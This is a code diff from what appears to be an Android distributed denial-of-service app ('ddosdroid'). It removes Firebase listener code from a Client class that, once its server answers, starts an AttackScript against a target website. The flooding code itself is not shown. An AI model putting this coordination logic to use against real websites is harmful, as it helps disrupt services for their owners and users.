@@ -17,14 +17,12 @@ import gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Attack;
  * They don't keep a connection for long. Their connection is live until the client
  * receives a response from server. After that client starts attacking.*/
 
-public class Client implements ConnectionToServer.ConnectionToServerListener, AttackRepository.OnRepositoryChangeListener {
+public class Client implements ConnectionToServer.ConnectionToServerListener{
     private static final String TAG = "MyClient";
 
     private Context context;
-
     private Attack attack;
     private AttackScript attackScript;
-    private AttackRepository repo;
 
     private ConnectionToServer serverConnection;
     private ClientConnectionListener clientConnectionListener;
@@ -45,13 +43,7 @@ public class Client implements ConnectionToServer.ConnectionToServerListener, At
         this.context = context;
         this.attack = attack;
         this.attackScript = new AttackScript(attack.getWebsite());
-        initRepo();
         initServerConnection();
-    }
-
-    private void initRepo() {
-        this.repo = new FirebaseRepository();
-        this.repo.setOnRepositoryChangeListener(this);
     }
 
     private void initServerConnection() {
@@ -74,7 +66,6 @@ public class Client implements ConnectionToServer.ConnectionToServerListener, At
 
     @Override
     public void onServerConnection() {
-        repo.startListenForChanges();
         if (!attackScript.isAlive()) {
             attackScript.start();
             clientConnectionListener.onClientConnected(attack.getWebsite());
@@ -97,7 +88,6 @@ public class Client implements ConnectionToServer.ConnectionToServerListener, At
     private void releaseResources() {
         serverConnection.releaseResources();
         attackScript.stopAttack();
-        repo.stopListenForChanges();
     }
 
     private void nullReferences() {
@@ -107,21 +97,5 @@ public class Client implements ConnectionToServer.ConnectionToServerListener, At
 
     public final Attack getAttack() {
         return attack;
-    }
-
-    @Override
-    public void onAttackUpload(Attack uploadedAttack) {
-        Log.d(TAG, "onAttackUpload()");
-    }
-
-    @Override
-    public void onAttackUpdate(Attack changedAttack) {
-        Log.d(TAG, "onAttackUpdate()");
-    }
-
-    @Override
-    public void onAttackDelete(Attack deletedAttack) {
-        if (deletedAttack.getPushId().equals(attack.getPushId()))
-            disconnect();
     }
 }
